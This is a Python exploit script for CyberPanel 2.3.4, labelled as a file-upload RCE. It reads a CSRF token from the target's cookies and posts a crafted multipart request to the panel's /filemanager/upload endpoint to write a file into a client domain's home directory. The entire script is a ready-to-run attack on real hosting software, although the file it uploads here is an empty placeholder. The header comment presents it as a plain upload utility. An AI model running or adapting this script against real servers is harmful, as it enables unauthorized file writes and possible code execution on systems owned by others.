#!/usr/bin/env python3
# cyberpanel-2.3.4-file-upload-RCE by Joseph Godwin Kimani
# This script allows users to upload files to a target server that requires a CSRF token for authentication. It retrieves the CSRF token from the server and uses it to perform a file upload via a multipart/form-data POST request. If the CSRF token cannot be automatically retrieved, the user will be prompted to enter it manually.
# https://github.com/josephgodwinkimani/cyberpanel-2.3.4-file-upload-RCE

import requests

def get_CSRF_token(target):
    """Retrieve CSRF token from the target server."""
    try:
        response = requests.get(target)
        response.raise_for_status()  # Raise an error for bad responses
        
        # Check if 'csrftoken' is in the cookies
        if 'csrftoken' in response.cookies:
            return response.cookies['csrftoken']
        else:
            print("CSRF token not found in cookies.")
            # Prompt user for CSRF token
            csrf_token = input("Please enter the CSRF token: ")
            return csrf_token
    except requests.RequestException as e:
        print(f"Error retrieving CSRF token: {e}")
        return None

def upload_file():
    target = input("Enter the target server (e.g., https://panel.domain.com): ")
    
    # Get CSRF token from the target server
    csrf_token = get_CSRF_token(target)
    if csrf_token is None:
        return  # Exit if CSRF token retrieval failed
    
    domain_name = input("Enter the domain name (e.g., clientdomain.com): ")    

    target_url = f"{target}/filemanager/upload"
    
    payload = f"-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"method:\"\r\n\r\nupload\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"home\"\r\n\r\n/home/{domain_name}\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"completePath\"\r\n\r\n/home/{domain_name}\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"domainRandomSeed\"\r\n\r\n\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"domainName\"\r\n\r\n{domain_name}\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.txt\"\r\nContent-Type: text/plain\r\n\r\n\r\n-----011000010111000001101001--\r\n"
   
    headers = {
        "Content-Type": "multipart/form-data; boundary=---011000010111000001101001",
        "Cookie": f"csrftoken={csrf_token};",
        "x-csrftoken": csrf_token,
        "Referer": f"{target}/filemanager/{domain_name}"
    }

    response = requests.post(target_url, data=payload, headers=headers)

    if response.status_code == 200:
        print(f"File uploaded successfully: {response.status_code} - {response.text}")
    else:
        print(f"Failed to upload file: {response.status_code} - {response.text}")

if __name__ == "__main__":
    upload_file()
